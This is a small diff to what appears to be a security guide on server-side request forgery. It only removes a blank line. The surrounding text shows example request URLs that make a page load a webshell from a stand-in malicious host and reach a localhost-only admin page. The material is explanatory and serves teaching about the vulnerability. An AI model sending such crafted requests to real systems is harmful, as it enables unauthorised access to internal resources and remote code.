@@ -23,7 +23,6 @@ Return the content of an external resource like a webshell.
 `https://example.com/page?page=https://malicioussite.com/shell.php`
 
 Use the localhost/loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
-
 These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
 
 `https://example.com/page?page=http://localhost/admin`
